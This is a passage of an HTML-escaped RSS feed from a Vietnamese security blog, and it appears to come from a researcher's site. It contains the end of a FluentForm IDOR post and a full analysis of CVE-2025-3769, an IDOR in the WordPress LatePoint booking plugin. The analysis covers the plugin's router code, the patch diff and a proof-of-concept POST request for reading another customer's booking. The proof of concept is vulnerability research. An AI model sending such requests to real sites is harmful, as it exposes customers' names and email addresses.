toán.&lt;/li&gt;&#xA;&lt;li&gt;IDOR thường phát sinh từ &lt;strong&gt;thiếu kiểm soát ownership&lt;/strong&gt;, không phải do thiếu xác thực đầu vào.&lt;/li&gt;&#xA;&lt;li&gt;Các endpoint &lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; cần được kiểm soát chặt chẽ vì chúng mở cho mọi đối tượng truy cập.&lt;/li&gt;&#xA;&lt;li&gt;Payment flow phải ràng buộc chặt chẽ giữa &lt;strong&gt;submission – transaction – payment intent&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Cần xác thực cả &lt;strong&gt;nguồn request&lt;/strong&gt; lẫn &lt;strong&gt;ngữ cảnh nghiệp vụ&lt;/strong&gt;, không chỉ dữ liệu.&lt;/li&gt;&#xA;&lt;li&gt;Defense-in-depth (nhiều lớp kiểm soát) là cách duy nhất để ngăn IDOR hiệu quả.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/fluentform/vulnerability/wordpress-fluent-forms-plugin-6-1-7-unauthenticated-insecure-direct-object-reference-to-payment-status-tampering-via-submission-id-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FluentForm Plugin &amp;lt;= 6.1.7 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3769 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-26-cve-2025-3769/</link>
      <pubDate>Fri, 26 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-26-cve-2025-3769/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;LatePoint – Calendar Booking Plugin for Appointments and Events&lt;/strong&gt; trên WordPress có &lt;strong&gt;lỗ hổng Insecure Direct Object Reference (IDOR)&lt;/strong&gt; ở tất cả các phiên bản lên đến và bao gồm &lt;strong&gt;5.1.92&lt;/strong&gt; thông qua tham số &lt;code&gt;view_booking_summary_in_lightbox&lt;/code&gt;, do &lt;strong&gt;thiếu kiểm tra hợp lệ trên khóa do người dùng điều khiển&lt;/strong&gt;.&lt;br&gt;&#xA;Lỗ hổng này cho phép &lt;strong&gt;kẻ tấn công chưa xác thực&lt;/strong&gt; có thể truy xuất chi tiết các cuộc hẹn, bao gồm &lt;strong&gt;tên khách hàng và địa chỉ email&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3769&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3769&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.1.92&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.1.93&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/latepoint/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LatePoint Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;LatePoint&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;5.1.92&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5.1.93&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_latepoint_route_call&amp;#39;, array( $this, &amp;#39;route_call&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; là hook dành cho người dùng chưa đăng nhập (kể cả Unauthenticated). Khi có request tới endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=latepoint_route_call&lt;/code&gt; thì callback &lt;code&gt;route_call&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function route_call() {&#xA;    $route_name = OsRouterHelper::get_request_param( &amp;#39;route_name&amp;#39;, OsRouterHelper::build_route_name( &amp;#39;dashboard&amp;#39;, &amp;#39;index&amp;#39; ) );&#xA;    OsRouterHelper::call_by_route_name( $route_name, OsRouterHelper::get_request_param( &amp;#39;return_format&amp;#39;, &amp;#39;html&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;route_call()&lt;/code&gt; gọi đến &lt;code&gt;get_request_param()&lt;/code&gt; với 2 tham số &lt;code&gt;&#39;route_name&#39;&lt;/code&gt; và giá trị default &lt;code&gt;OsRouterHelper::build_route_name( &#39;dashboard&#39;, &#39;index&#39; )&lt;/code&gt; nếu param &lt;code&gt;route_name&lt;/code&gt; không tồn tại trong request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_request_param($name, $default = false){&#xA;    // $name = &amp;#39;route_name&amp;#39;&#xA;    // $default = OsRouterHelper::build_route_name( &amp;#39;dashboard&amp;#39;, &amp;#39;index&amp;#39;&#xA;    if(isset($_GET[$name])){&#xA;      $param = sanitize_text_field(wp_unslash($_GET[$name]));&#xA;    }elseif(isset($_POST[$name])){&#xA;      $param = sanitize_text_field(wp_unslash($_POST[$name]));&#xA;    }else{&#xA;    &#x9;$param = $default;&#xA;    }&#xA;    return $param;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public static function build_route_name($controller, $action){&#xA;    return $controller.&amp;#39;__&amp;#39;.$action;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau khi có giá trị của &lt;code&gt;$route_name&lt;/code&gt;, hàm tiếp tục gọi &lt;code&gt;call_by_route_name&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function call_by_route_name($route_name, $return_format = &amp;#39;html&amp;#39;){&#xA;    OsDebugHelper::log_route($route_name, $return_format);&#xA;    $route_data = self::convert_route_name_to_controller_and_action($route_name);&#xA;    if(!empty($route_data)){&#xA;        $controller_obj = $route_data[&amp;#39;controller&amp;#39;];&#xA;        $action = $route_data[&amp;#39;action&amp;#39;];&#xA;        if($return_format) $controller_obj-&amp;gt;set_return_format($return_format);&#xA;        // check if user is allowed to access this route&#xA;        if($controller_obj-&amp;gt;can_current_user_access_action($action)){&#xA;            $controller_obj-&amp;gt;route_name = $route_name;&#xA;            $controller_obj-&amp;gt;$action();&#xA;        }else{&#xA;            if($controller_obj-&amp;gt;get_return_format() == &amp;#39;json&amp;#39;){&#xA;                $controller_obj-&amp;gt;send_json( [&amp;#39;status&amp;#39; =&amp;gt; LATEPOINT_STATUS_ERROR, &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;Not Authorized&amp;#39;, &amp;#39;latepoint&amp;#39;)] );&#xA;            }else{&#xA;                echo &amp;#39;&amp;lt;div class=&amp;#34;latepoint-not-authorized&amp;#34;&amp;gt;&amp;lt;div class=&amp;#34;not-authorized-message&amp;#34;&amp;gt;&amp;#39;.esc_html__(&amp;#39;Not Authorized&amp;#39;, &amp;#39;latepoint&amp;#39;).&amp;#39;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;#39;;&#xA;            }&#xA;            exit();&#xA;        }&#xA;    }else{&#xA;        esc_html_e(&amp;#39;Page Not Found&amp;#39;, &amp;#39;latepoint&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;call_by_route_name()&lt;/code&gt; sẽ ghi log route, lấy controller và action tương ứng với route đó gán cho &lt;code&gt;$route_data&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function convert_route_name_to_controller_and_action($route_name): array{&#xA;    list($controller_name, $action) = explode(&amp;#39;__&amp;#39;, $route_name);&#xA;    if(empty($controller_name) || empty($action)) return [];&#xA;    $controller_name = str_replace(&amp;#39;_&amp;#39;, &amp;#39;&amp;#39;, ucwords($controller_name, &amp;#39;_&amp;#39;));&#xA;    $controller_class_name = &amp;#39;Os&amp;#39;.$controller_name.&amp;#39;Controller&amp;#39;;&#xA;    if(class_exists($controller_class_name)) {&#xA;        $controller_obj = new $controller_class_name();&#xA;        if(method_exists($controller_obj, $action)) {&#xA;            // check if action is valid&#xA;            return [&amp;#39;controller&amp;#39; =&amp;gt; $controller_obj, &amp;#39;action&amp;#39; =&amp;gt; $action];&#xA;        }else{&#xA;            return [];&#xA;        }&#xA;    }else{&#xA;        return [];&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm nhận &lt;code&gt;$route_name&lt;/code&gt; dạng &lt;code&gt;&#39;controller__action&#39;&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Tách chuỗi theo &lt;code&gt;__&lt;/code&gt; ra &lt;code&gt;$controller_name&lt;/code&gt; và &lt;code&gt;$action&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu rỗng → trả về &lt;code&gt;[]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Chuyển &lt;code&gt;$controller_name&lt;/code&gt; sang PascalCase, bỏ &lt;code&gt;_&lt;/code&gt;, thêm prefix &lt;code&gt;Os&lt;/code&gt; và suffix &lt;code&gt;Controller&lt;/code&gt; → tên class.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra class tồn tại → tạo object.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra method tồn tại trong object → trả về mảng &lt;code&gt;[&#39;controller&#39; =&amp;gt; object, &#39;action&#39; =&amp;gt; method]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu class hoặc method không tồn tại → trả về mảng rỗng &lt;code&gt;[]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;call_by_route_name()&lt;/code&gt; tiếp tục sẽ kiểm tra &lt;code&gt;$route_data&lt;/code&gt; nếu không rỗng thì set format trả về, check quyền truy cập &lt;code&gt;can_current_user_access_action($action)&lt;/code&gt;: Nếu user hiện tại có thể  truy cập action này thì gọi method action: &lt;code&gt;$controller_obj-&amp;gt;$action()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Mặc định, khi người dùng có cookie của &lt;code&gt;LatePoint&lt;/code&gt; (trở thành customer) thì đáp ứng điều kiện này.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/cookie.png&#34; title=&#34;Cookie của người dùng LatePoint&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/cookie.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;Cookie của người dùng LatePoint&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/cookie.png&#39; alt=&#34;Cookie&#34; height=&#34;388&#34; width=&#34;773&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cookie của người dùng LatePoint&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Để có được cookie này, ta cần phải order và sử dụng chức năng create account:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/order.png&#34; title=&#34;Tạo account&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/order.png&#34; data-sub-html=&#34;&lt;h2&gt;Account&lt;/h2&gt;&lt;p&gt;Tạo account&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/order.png&#39; alt=&#34;Account&#34; height=&#34;899&#34; width=&#34;694&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tạo account&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Khi thực hiện diff code, tôi thấy một số logic thuộc các hàm của class &lt;code&gt;OsCustomerCabinetController&lt;/code&gt; đã được fix bằng cách kiểm tra quyền sở hữu trước khi trả dữ liệu:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $order-&amp;gt;is_new_record() || ( $order-&amp;gt;customer_id != OsAuthHelper::get_logged_in_customer_id() ) ) {&#xA;    $this-&amp;gt;send_json( array(&#xA;        &amp;#39;status&amp;#39; =&amp;gt; LATEPOINT_STATUS_ERROR,&#xA;        &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;Not Allowed&amp;#39;, &amp;#39;latepoint&amp;#39;)&#xA;    ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/diff.png&#34; title=&#34;Một số hàm được fix&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Fix&lt;/h2&gt;&lt;p&gt;Một số hàm được fix&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/diff.png&#39; alt=&#34;Fix&#34; height=&#34;915&#34; width=&#34;1860&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Một số hàm được fix&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khớp với phân tích của tôi ở trên, ví dụ:&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Route hợp lệ&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;route_name=customer_cabinet__view_booking_summary_in_lightbox&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;sẽ được map thành&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;OsCustomerCabinetController::view_booking_summary_in_lightbox()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;view_booking_summary_in_lightbox()&lt;/code&gt; được gọi để trả về dữ liệu booking.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Create Booking (no login required)&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Creates Customer account&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Customer cookie issued (logged-in as customer)&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Attacker sends request to admin-ajax.php?action=latepoint_route_call&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;route_name=customer_cabinet__view_booking_summary_in_lightbox&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Router resolves to OsCustomerCabinetController&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;can_current_user_access_action() → PASS&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;view_booking_summary_in_lightbox() called&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;Booking ID taken from request&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;No ownership validation (&amp;lt;= 5.1.92)&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Sensitive booking data leaked (email, name, etc.)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Gửi request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php?t=1766721895425 HTTP/1.1&#xA;Host: localhost&#xA;Cookie: __stripe_mid=f13365af-449c-4412-b77c-7213da0dbe814d9925; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; latepoint_cart_86a9106ae65537651a8e456835b316ab=8ffe0e2c-9c69-48f8-94d9-18dd24022f90; latepoint_customer_logged_in_cookie&#xA;&#xA;action=latepoint_route_call&amp;amp;route_name=customer_cabinet__view_booking_summary_in_lightbox&amp;amp;params=booking_id=other_booking_id&amp;amp;return_format=json&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Resutl&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/result.png&#39; alt=&#34;Resutl&#34; height=&#34;653&#34; width=&#34;1874&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 